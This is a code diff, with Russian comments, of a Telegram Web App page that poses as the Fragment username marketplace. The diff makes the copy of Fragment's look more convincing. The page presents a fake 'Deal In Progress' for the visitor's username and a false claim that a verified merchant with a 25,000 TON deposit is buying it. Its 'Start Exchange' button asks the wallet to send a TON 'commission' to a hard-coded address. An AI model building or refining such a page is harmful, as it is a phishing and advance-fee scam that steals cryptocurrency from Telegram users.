@@ -6,115 +6,170 @@
     <title>Fragment Username Exchange</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { 
-            --primary: #0088cc; 
-            --border: #e0e0e0;
+        :root {
+            --primary: #8a3ffc;       /* Основной фиолетовый Fragment */
+            --primary-dark: #6e2dc4;  /* Темный фиолетовый */
+            --accent: #0f62fe;        /* Акцентный синий */
+            --bg-dark: #161616;       /* Тёмный фон */
+            --bg-card: #262626;       /* Фон карточек */
+            --text-primary: #f4f4f4;  /* Основной текст */
+            --text-secondary: #c6c6c6;/* Вторичный текст */
+            --border: #393939;        /* Границы */
+            --success: #42be65;       /* Успех */
         }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
-            padding: 0;
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-primary);
             margin: 0;
-            background-color: #ffffff;
-            color: #000000;
-            line-height: 1.5;
-            font-size: 16px;
+            padding: 0;
+            line-height: 1.6;
+            font-size: 15px;
         }
+        
         .container {
             max-width: 100%;
             padding: 16px;
             box-sizing: border-box;
         }
+        
+        /* Шапка в стиле Fragment */
         .header {
-            color: var(--primary);
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 4px;
-        }
-        .subheader {
-            font-size: 16px;
-            color: #495057;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 0;
             margin-bottom: 16px;
+            border-bottom: 1px solid var(--border);
         }
-        .divider {
-            height: 1px;
-            background-color: var(--border);
-            margin: 12px 0;
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            font-weight: 600;
+            font-size: 20px;
+            color: var(--text-primary);
         }
+        
+        .logo-icon {
+            color: var(--primary);
+            margin-right: 8px;
+            font-size: 22px;
+        }
+        
+        .user-actions {
+            display: flex;
+            gap: 12px;
+        }
+        
+        .icon-btn {
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 18px;
+            cursor: pointer;
+            padding: 6px;
+        }
+        
+        /* Основной контент */
+        .card {
+            background-color: var(--bg-card);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        .section-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .section-title i {
+            margin-right: 8px;
+            color: var(--primary);
+        }
+        
         .badge {
             display: inline-block;
-            background-color: #e6f7ff;
+            background-color: rgba(138, 63, 252, 0.15);
             color: var(--primary);
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 500;
-            padding: 4px 12px;
-            border-radius: 12px;
+            padding: 4px 10px;
+            border-radius: 16px;
             margin-bottom: 12px;
         }
+        
         .username-title {
             font-size: 24px;
             font-weight: 700;
             margin: 8px 0 20px;
-            color: #000000;
+            color: var(--text-primary);
         }
-        table.deal-table {
+        
+        /* Таблица цен */
+        .pricing-table {
             width: 100%;
             border-collapse: collapse;
             margin-bottom: 24px;
         }
-        table.deal-table th, 
-        table.deal-table td {
-            padding: 8px 0;
-            text-align: center;
-        }
-        table.deal-table th {
+        
+        .pricing-table th {
+            text-align: left;
             font-weight: 500;
-            color: #6c757d;
-            font-size: 15px;
+            color: var(--text-secondary);
+            padding-bottom: 10px;
+            font-size: 14px;
         }
-        table.deal-table td {
-            font-weight: 700;
-            font-size: 20px;
-            color: #000000;
+        
+        .pricing-table td {
+            padding: 8px 0;
+            font-weight: 600;
+            font-size: 18px;
         }
+        
         .dollar-value {
             font-weight: 400;
             font-size: 14px;
-            color: #6c757d;
+            color: var(--text-secondary);
         }
-        .info-section {
-            margin-bottom: 24px;
+        
+        /* Информационные блоки */
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 20px;
         }
-        .info-section p {
-            margin: 8px 0;
-            color: #6c757d;
-            font-size: 15px;
+        
+        .info-item {
+            background-color: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            padding: 12px;
         }
-        .info-row {
-            margin: 16px 0;
-        }
-        .info-row strong {
-            display: block;
-            color: #000000;
-            font-weight: 600;
-            font-size: 15px;
+        
+        .info-label {
+            font-size: 13px;
+            color: var(--text-secondary);
             margin-bottom: 4px;
         }
-        .info-row span {
-            display: block;
+        
+        .info-value {
             font-size: 16px;
-            color: #495057;
-            font-weight: 400;
+            font-weight: 500;
         }
-        .ton-address {
-            font-family: monospace;
-            font-size: 15px;
-            color: #495057;
-            line-height: 1.4;
-            word-break: break-all;
-        }
-        button {
-            background-color: var(--primary);
+        
+        /* Кнопка */
+        .action-btn {
+            background: linear-gradient(135deg, var(--primary), var(--accent));
             color: white;
             border: none;
             border-radius: 12px;
@@ -123,57 +178,68 @@
             font-size: 17px;
             font-weight: 600;
             cursor: pointer;
-            margin: 16px 0;
+            margin: 20px 0;
+            transition: all 0.2s ease;
         }
+        
+        .action-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(138, 63, 252, 0.3);
+        }
+        
+        .action-btn:active {
+            transform: translateY(0);
+        }
+        
+        /* Примечание */
         .note {
-            background-color: #f1f8ff;
-            border-radius: 12px;
-            padding: 16px;
+            background-color: rgba(15, 98, 254, 0.1);
+            border-left: 3px solid var(--accent);
+            border-radius: 0 8px 8px 0;
+            padding: 14px;
             font-size: 14px;
-            color: #495057;
-            margin: 16px 0;
+            color: var(--text-secondary);
+            margin: 20px 0;
             line-height: 1.5;
         }
-        .trade-info {
-            background: white;
-            border-radius: 12px;
-            padding: 16px;
-            margin-top: 20px;
+        
+        .note strong {
+            color: var(--text-primary);
         }
-        .trade-info h3 {
-            font-size: 16px;
-            margin-top: 0;
-            margin-bottom: 16px;
-            color: #000000;
-            font-weight: 600;
-        }
-        table.trade-table {
-            width: 100%;
-            border-collapse: collapse;
+        
+        /* Торговая информация */
+        .trade-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 2fr;
+            gap: 10px;
             font-size: 14px;
         }
-        table.trade-table th {
-            text-align: left;
+        
+        .trade-header {
+            color: var(--text-secondary);
             font-weight: 500;
-            color: #6c757d;
-            padding-bottom: 8px;
+            margin-bottom: 8px;
         }
-        table.trade-table td {
-            padding: 4px 0;
+        
+        .trade-value {
             font-weight: 500;
         }
+        
         .status-ready {
-            font-weight: 700;
-            color: #000000;
+            color: var(--success);
+            font-weight: 600;
         }
+        
         .address {
             word-break: break-all;
             font-family: monospace;
-            font-size: 12px;
-            color: #495057;
+            font-size: 13px;
+            color: var(--text-secondary);
         }
+        
+        /* Лоадер */
         .loader {
-            border: 4px solid #f3f3f3;
+            border: 4px solid rgba(255, 255, 255, 0.1);
             border-top: 4px solid var(--primary);
             border-radius: 50%;
             width: 30px;
@@ -182,88 +248,137 @@
             margin: 20px auto;
             display: none;
         }
+        
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
         .update-text {
             text-align: center;
             font-size: 14px;
-            color: #6c757d;
+            color: var(--text-secondary);
             margin-top: 8px;
         }
-        .center {
-            text-align: center;
+        
+        /* Иконки */
+        .fragment-icon {
+            width: 24px;
+            height: 24px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background-color: rgba(138, 63, 252, 0.2);
+            color: var(--primary);
+            border-radius: 6px;
+            margin-right: 10px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">FRAGMENT</div>
-        <div class="subheader">Search usernames</div>
-        <div class="divider"></div>
-        
-        <div class="badge">Deal In Progress</div>
-        <div class="username-title" id="usernameDisplay">biruk.t.me</div>
-        
-        <table class="deal-table">
-            <tr>
-                <th>Deal Price</th>
-                <th>Commission</th>
-            </tr>
-            <tr>
-                <td>
-                    <div id="priceDisplay">100 TON</div>
-                    <div class="dollar-value" id="priceDollar">~ $0.00</div>
-                </td>
-                <td>
-                    <div id="commissionDisplay">5 TON</div>
-                    <div class="dollar-value" id="commissionDollar">~ $0.00</div>
-                </td>
-            </tr>
-        </table>
-        
-        <div class="info-section">
-            <p>How does this work?</p>
-            
-            <div class="info-row">
-                <strong>Telegram Username</strong>
-                <span id="usernameText">@biruk</span>
+        <!-- Шапка в стиле Fragment -->
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-cube logo-icon"></i>
+                <span>FRAGMENT</span>
             </div>
-            
-            <div class="info-row">
-                <strong>Web Address</strong>
-                <span>t.me/<span id="usernameLink">biruk</span></span>
-            </div>
-            
-            <div class="info-row">
-                <strong>TON Web 3.0 Address</strong>
-                <span class="ton-address" id="tonAddress">biruk.t.me</span>
+            <div class="user-actions">
+                <button class="icon-btn">
+                    <i class="fas fa-bell"></i>
+                </button>
+                <button class="icon-btn">
+                    <i class="fas fa-cog"></i>
+                </button>
             </div>
         </div>
         
-        <button id="startExchange">Start Exchange</button>
-        <div class="loader" id="loader"></div>
-        <div class="update-text">Subscribe to updates</div>
-        
-        <div class="note">
-            You do not need to complete KYC verification, as the buyer is a verified merchant on a Fragment that has a security deposit of <strong>25,000 TON</strong>.
-        </div>
-        
-        <div class="trade-info">
-            <h3>Trade Info</h3>
-            <table class="trade-table">
+        <!-- Основной контент -->
+        <div class="card">
+            <div class="section-title">
+                <i class="fas fa-search"></i>
+                <span>Search usernames</span>
+            </div>
+            
+            <div class="badge">
+                <i class="fas fa-sync-alt"></i> Deal In Progress
+            </div>
+            
+            <div class="username-title" id="usernameDisplay">biruk.t.me</div>
+            
+            <table class="pricing-table">
                 <tr>
-                    <th>Deal Status</th>
-                    <th>TON - Username</th>
-                    <th>Recipient</th>
+                    <th>Deal Price</th>
+                    <th>Commission</th>
                 </tr>
                 <tr>
-                    <td class="status-ready">Ready</td>
-                    <td>Swappable</td>
-                    <td class="address" id="recipientAddress">Ef_BbsF16B4aReCFhXIO...</td>
+                    <td>
+                        <div id="priceDisplay">100 TON</div>
+                        <div class="dollar-value" id="priceDollar">~ $522.00</div>
+                    </td>
+                    <td>
+                        <div id="commissionDisplay">5 TON</div>
+                        <div class="dollar-value" id="commissionDollar">~ $26.10</div>
+                    </td>
                 </tr>
             </table>
+            
+            <p style="color: var(--text-secondary); margin-bottom: 20px;">
+                <i class="fas fa-info-circle" style="color: var(--accent); margin-right: 8px;"></i>
+                How does this work?
+            </p>
+            
+            <div class="info-grid">
+                <div class="info-item">
+                    <div class="info-label">Telegram Username</div>
+                    <div class="info-value" id="usernameText">@biruk</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Web Address</div>
+                    <div class="info-value">t.me/<span id="usernameLink">biruk</span></div>
+                </div>
+                <div class="info-item" style="grid-column: span 2;">
+                    <div class="info-label">TON Web 3.0 Address</div>
+                    <div class="info-value" id="tonAddress">biruk.t.me</div>
+                </div>
+            </div>
+        </div>
+        
+        <button class="action-btn" id="startExchange">
+            <i class="fas fa-exchange-alt" style="margin-right: 10px;"></i>Start Exchange
+        </button>
+        
+        <div class="loader" id="loader"></div>
+        
+        <div class="update-text">
+            <i class="fas fa-bell" style="margin-right: 6px;"></i> Subscribe to updates
+        </div>
+        
+        <div class="note">
+            <i class="fas fa-shield-alt" style="margin-right: 8px; color: var(--accent);"></i>
+            You do not need to complete KYC verification, as the buyer is a verified merchant on Fragment that has a security deposit of <strong>25,000 TON</strong>.
+        </div>
+        
+        <div class="card">
+            <div class="section-title">
+                <i class="fas fa-chart-line"></i>
+                <span>Trade Info</span>
+            </div>
+            
+            <div class="trade-grid">
+                <div>
+                    <div class="trade-header">Deal Status</div>
+                    <div class="trade-value status-ready">Ready</div>
+                </div>
+                <div>
+                    <div class="trade-header">TON - Username</div>
+                    <div class="trade-value">Swappable</div>
+                </div>
+                <div>
+                    <div class="trade-header">Recipient</div>
+                    <div class="trade-value address" id="recipientAddress">Ef_BbsF16B4aReCFhXIO...</div>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -279,6 +394,10 @@
         Telegram.ready();
         Telegram.expand();
         Telegram.BackButton.hide();
+        
+        // Установим тему Telegram в темный режим
+        Telegram.setHeaderColor('#161616');
+        Telegram.setBackgroundColor('#161616');
         
         function parseStartParams() {
             const params = new URLSearchParams(window.location.search).get('tgWebAppStartParam');
@@ -301,7 +420,7 @@
         function updateUI() {
             const { username, price, commission } = parseStartParams();
             
-            // Рассчитываем примерную стоимость в долларах (курс 1 TON ≈ $5.22)
+            // Рассчитываем примерную стоимость в долларах
             const priceDollar = (parseFloat(price) * 5.22).toFixed(2);
             const commissionDollar = (parseFloat(commission) * 5.22).toFixed(2);
             
@@ -314,7 +433,7 @@
             document.getElementById('commissionDollar').textContent = `~ $${commissionDollar}`;
             document.getElementById('tonAddress').textContent = `${username}.t.me`;
             
-            // Форматируем адрес получателя (первые 10 символов + ... + последние 10 символов)
+            // Форматируем адрес получателя
             const fullAddress = "Ef_BbsF16B4aReCFhXIO1234567890abcdef";
             const formattedAddress = `${fullAddress.substring(0, 10)}...${fullAddress.substring(fullAddress.length - 10)}`;
             document.getElementById('recipientAddress').textContent = formattedAddress;
@@ -345,7 +464,7 @@
                     validUntil: Math.floor(Date.now() / 1000) + 600,
                     messages: [
                         {
-                            address: "Ef_BbsF16B4aReCFhXIO1234567890abcdef", // Ваш реальный адрес
+                            address: "Ef_BbsF16B4aReCFhXIO1234567890abcdef",
                             amount: `${parseInt(parseStartParams().commission) * 1000000000}`
                         }
                     ]
@@ -361,7 +480,15 @@
                             commission: parseStartParams().commission,
                             tx_hash: result.boc
                         }));
-                        Telegram.close();
+                        
+                        // Показываем анимацию успеха
+                        document.getElementById('startExchange').innerHTML = 
+                            '<i class="fas fa-check"></i> Completed!';
+                        document.getElementById('startExchange').style.background = 'var(--success)';
+                        
+                        setTimeout(() => {
+                            Telegram.close();
+                        }, 2000);
                     } else {
                         Telegram.showAlert("⚠️ Payment failed. Please try again.");
                     }
